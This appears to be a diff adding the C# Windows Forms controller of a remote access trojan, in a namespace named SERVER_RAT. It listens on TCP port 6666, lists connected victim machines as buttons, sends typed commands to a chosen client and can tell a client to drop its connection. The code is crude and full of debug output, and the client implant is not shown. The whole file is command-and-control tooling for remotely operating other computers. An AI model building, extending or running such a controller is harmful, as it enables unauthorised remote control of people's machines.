@@ -1,0 +1,421 @@
+using System;
+using System.Collections;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Diagnostics;
+using System.Drawing;
+using System.Drawing.Drawing2D;
+using System.IO;
+using System.IO.Pipes;
+using System.Linq;
+using System.Linq.Expressions;
+using System.Net;
+using System.Net.Http;
+using System.Net.NetworkInformation;
+using System.Net.Sockets;
+using System.Runtime.InteropServices;
+using System.Runtime.InteropServices.ComTypes;
+using System.Runtime.Remoting.Messaging;
+using System.Security.Cryptography;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using static System.Windows.Forms.VisualStyles.VisualStyleElement;
+using static System.Windows.Forms.VisualStyles.VisualStyleElement.ProgressBar;
+using Button = System.Windows.Forms.Button;
+using TextBox = System.Windows.Forms.TextBox;
+
+
+namespace SERVER_RAT
+{
+    
+    public partial class Form1 : Form
+    {
+        
+        TcpListener tcpListener = new TcpListener(System.Net.IPAddress.Any, 6666);
+        private int appStatus = 0;
+        TcpClient client;
+        TcpClient streamData;
+        List<TcpClient> clientList = new List<TcpClient>();
+        List<string> clientNames = new List<string>();
+        List<Button> buttonsAdded = new List<Button>();
+        NetworkStream networkStream;
+        Thread th_StartListen, th_inPutStream, th_checkConnection, th_updateClientNames, th_cleanConnection;
+        StringBuilder strOutput;
+        public static string cmdres = "";
+        
+        int client_index = 0;
+        int listener = 0;
+        
+        public Form1()
+        {
+            InitializeComponent();
+            customizeDesign();
+        }
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            th_StartListen = new Thread(new ThreadStart(StartListen));
+            th_StartListen.Start();
+        }
+
+        public void StartListen()
+        {
+            Console.WriteLine("listener");
+            Console.WriteLine(listener); 
+            //Creating a TCP Connection and listening to the port
+            if (listener==0) {
+                tcpListener = new TcpListener(System.Net.IPAddress.Any, 6666);
+                tcpListener.Start();
+                listener = 1;
+            }
+          toolStripStatusLabel1.Text = "Listening on port 6666 ...";
+            int counter = 0;
+            appStatus = 0;
+
+            while (true)
+            {
+                try
+                {
+                    client = tcpListener.AcceptTcpClient();
+                    clientList.Add(client);
+
+                    //Updating status of connection
+                    IPEndPoint ipend = (IPEndPoint)client.Client.RemoteEndPoint;
+                    toolStripStatusLabel1.Text = "Connected from " + IPAddress.Parse(ipend.Address.ToString());
+                    appStatus = 1;
+                    int placer = counter + 1;
+                    string index = placer.ToString();//send the index at which it is connected 
+                    string msg = string.Concat("client", index);
+                    byte[] message = Encoding.ASCII.GetBytes(msg);
+                    NetworkStream networkstream = client.GetStream();//OrderedEnumerableRowCollection you can pass the hnaldle to the reader
+                    networkstream.Write(message, 0, message.Length);
+                    //generate thread and dedicate  it everytime you get but to  put you a better position you hold he handle of client in the clientlist that you will use to assing your stream to
+                    //this is exxcelent so no keeping threads ruuning all time for no reason 
+                    // you actually make the thread just to makesure there is a thread running the function inputstream 
+                    Console.WriteLine("counter is");
+                    Console.WriteLine(counter);
+                    th_inPutStream = new Thread(delegate () { inPutStream(client, counter); });
+                                        th_inPutStream.Start();
+                    System.Threading.Thread.Sleep(4000);//the variable counter is accessed by the next loop before it if fully put to use either sleep or use mutex
+
+                    counter++;
+                }
+                catch (Exception err)
+                {
+                    Cleanup_dep();
+                }
+            }
+        }
+
+
+        private bool IsConnected(int i)
+        {
+            try
+            {
+                return !(clientList[i].Client.Poll(1, SelectMode.SelectRead) && clientList[i].Client.Available == 0);
+            }
+            catch (SocketException) { Cleanup_dep(); return false; }
+        }
+
+
+
+
+        //This will listen for dat available and action based on Message ID.
+        private void inPutStream(TcpClient client, int client_pos)
+        {
+            try
+            {
+                while (true)
+
+                {
+                    // read the file
+                    StreamReader sr = new StreamReader("command.txt");
+                    sr.BaseStream.Seek(0, SeekOrigin.Begin);
+                    string str = sr.ReadLine();
+                    sr.Close();
+
+                    int myclient_pos = client_pos;
+                    Console.WriteLine("the file gave ",str);
+                    Console.WriteLine(client_pos);
+                    Console.WriteLine("see this");
+                    Console.WriteLine(client_index);
+                    Console.Write(myclient_pos);
+                   
+                    bool bo = str.Equals("1");
+                    Console.WriteLine("boolean is ");
+                    Console.WriteLine(bo);
+                    if (bo == true) {
+                        
+
+                        if (client_index == myclient_pos)
+                        {
+                            Console.WriteLine("the time i now  ");
+                            Console.WriteLine("we are done now");
+                            Console.WriteLine("killed a connection");
+
+                            str = null;
+                            StreamWriter sw = new StreamWriter("command.txt");
+                            sw.WriteLine(str);
+                            sw.Flush();
+                            sw.Close();
+
+                            byte[] message = Encoding.ASCII.GetBytes("kill_connection");
+                            //get the saved node handle
+                            NetworkStream networkstream = clientList[client_index].GetStream();//OrderedEnumerableRowCollection you can pass the hnaldle to the reader
+                            networkstream.Write(message, 0, message.Length);
+                            Boolean status = IsConnected(client_pos - 1);
+                            Console.WriteLine(status);
+                            client_index = 0;
+                        }
+                    }
+                    System.Threading.Thread.Sleep(4000);
+                }
+            }
+            catch (Exception err)
+            {
+                {
+                    Cleanup_dep();
+                }
+            }
+
+        }
+
+
+        private void updateLabel(Label label, string strdata, int row)
+        {
+            label.Invoke((MethodInvoker)delegate
+            {
+                label.Text = strdata.Split(new char[] { '\r', '\n' })[row];
+            });
+
+        }
+
+        private void updateText(TextBox text, string strdata)
+        {
+            text.Invoke((MethodInvoker)delegate
+            {
+                text.AppendText(strdata);
+            });
+
+        }
+
+
+        public void sendMessage(int bufferSize1, int messageID1, string message1)
+        {
+            NetworkStream networkstream = client.GetStream();
+
+
+            int bufferSize = bufferSize1;
+            var message = message1;
+
+            int messageID = messageID1;
+
+            string headerStr = "len:" + message.Length.ToString() + "\r\nMsgId:" + messageID;
+
+            byte[] headerLength = BitConverter.GetBytes(headerStr.Length);
+
+            networkstream.Write(headerLength, 0, 4);
+
+            networkstream.Write(Encoding.ASCII.GetBytes(headerStr), 0, headerStr.Length);
+                        int bytesSent = 0;
+            int bytesLeft = message.Length;
+            byte[] encodedMessage = Encoding.ASCII.GetBytes(message);
+
+            while (bytesLeft > 0)
+            {
+                int curDataSize = Math.Min(bufferSize, bytesLeft);
+                networkstream.Write(encodedMessage, bytesSent, curDataSize);
+
+                bytesSent += curDataSize;
+                bytesLeft -= curDataSize;
+            }
+        }
+
+
+
+        private string receiveMessage(int messageSize, int bufferSize, NetworkStream networkstream)
+        {
+            byte[] message = new byte[messageSize];
+            int bytesLeft = messageSize;
+            int bytesRead = 0;
+            StringBuilder messageString = new StringBuilder();
+
+            while (bytesLeft > 0)
+            {
+                int curDataSize = Math.Min(bufferSize, bytesLeft);
+                if (client.Available < curDataSize)
+                    curDataSize = client.Available; //This saved me
+
+                int bytes = networkstream.Read(message, bytesRead, curDataSize);
+                string messagestrr = Encoding.ASCII.GetString(message, bytesRead, bytes);
+                messageString.Append(messagestrr);
+                bytesRead += curDataSize;
+                bytesLeft -= curDataSize;
+            }
+            return messageString.ToString();
+
+        }
+
+        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            System.Environment.Exit(System.Environment.ExitCode);
+        }
+
+        private void Cleanup_dep()
+        {
+            try
+            {
+                toolStripStatusLabel1.Text = "Connection Lost";
+
+            }
+            catch (Exception err) { }
+        }
+
+
+        private void Cleanup(int i)
+        {
+            try
+            {
+                toolStripStatusLabel1.Text = "Connection Lost";
+                clientNames.RemoveAt(i);
+                clientList.RemoveAt(i);
+                updateClientListUI();
+
+
+            }
+            catch (Exception err) { }
+        }
+
+
+
+        #region CLIENT BUTTON MANAGEMENT
+
+        private void updateClientListUI()
+        {
+            if (this.InvokeRequired)
+            {
+                this.Invoke(new MethodInvoker(this.updateClientListUI));
+            }
+            else
+            {
+                //Debug.WriteLine(clientNames[0]);
+                int basex = subPanelClient.Location.X;
+                int basey = subPanelClient.Location.Y;
+                subPanelClient.Controls.Clear();
+                Debug.WriteLine(clientNames.Count);
+
+                for (int i = 0; i < clientNames.Count; i++)
+                {
+                    Button b = new Button();
+                    b.Left = basex;
+                    b.Top = basey;
+                    b.Size = new Size(25, 25); // <== add this line
+                    b.Dock = DockStyle.Top;
+                    b.ForeColor = Color.Gainsboro;
+                    b.FlatStyle = FlatStyle.Flat;
+                    b.FlatAppearance.BorderSize = 0;
+                    b.Padding = new Padding(35, 0, 0, 0);
+                    b.TextAlign = ContentAlignment.MiddleLeft;
+                    basey += 25;
+                    b.Name = clientNames[i];
+                    b.Text = clientNames[i];
+                    b.Click += new EventHandler(button_Click1);
+                    subPanelClient.Controls.Add(b);
+                    buttonsAdded.Insert(i, b);
+                }
+            }
+        }
+
+        private void button_Click1(object sender, EventArgs e)
+        {
+            Button selected = sender as Button;
+            openClientForm(new Form2());
+            sendMessage("".Length, 4, ""); 
+        }
+
+        private void customizeDesign()
+        {
+            subPanelClient.Visible = false;
+        }
+
+        private void hideSubMenu()
+        {
+            if (subPanelClient.Visible == true)
+                subPanelClient.Visible = false;
+        }
+
+        private void showSubMenu(Panel subMenu)
+        {
+            if (subMenu.Visible == false)
+            {
+                hideSubMenu();
+                subMenu.Visible = true;
+            }
+            else
+                subMenu.Visible = false;
+        }
+        private void buttonClients_Click(object sender, EventArgs e)
+        {
+            showSubMenu(subPanelClient);
+        }
+        private void client_zone(object sender, EventArgs e, int client_name)
+        {
+           
+            Form2 Myform2 = new Form2();
+            Myform2.Show();
+            client_index = client_name;
+            Console.WriteLine("transitioned");
+            Console.WriteLine(client_name);
+        }
+       
+        private void show_form(object sender, EventArgs e)
+        {
+            this.Show();
+        }
+        #endregion
+
+
+        #region FORM MANAGEMENT
+
+        private Form2 activeForm = null;
+        private void openClientForm(Form2 clientForm)
+        {
+            if (activeForm != null)
+                activeForm.Close();
+            activeForm = clientForm;
+            clientForm.TopLevel = false;
+            clientForm.FormBorderStyle = FormBorderStyle.None;
+            clientForm.Dock = DockStyle.Fill;
+            panelClientForm.Controls.Add(clientForm);
+            panelClientForm.Tag = clientForm;
+            clientForm.BringToFront();
+            clientForm.cmdInputTxt += cmdInputTxt;
+            clientForm.killButton += killButton;
+            clientForm.Show();
+        }
+
+        private void cmdInputTxt(string inputTxt)
+        {
+            sendMessage(inputTxt.Length, 2, inputTxt);
+        }
+        
+        public void  killButton(object sender, EventArgs e)
+        {
+            //create file write to it a cmd
+            string str = "1";
+            StreamWriter sw = new StreamWriter("command.txt");
+            sw.WriteLine(str);
+            sw.Flush();
+            sw.Close();
+            
+            Console.WriteLine("cmd command ");
+                   }
+
+
+        #endregion
+
+    }
+}
+
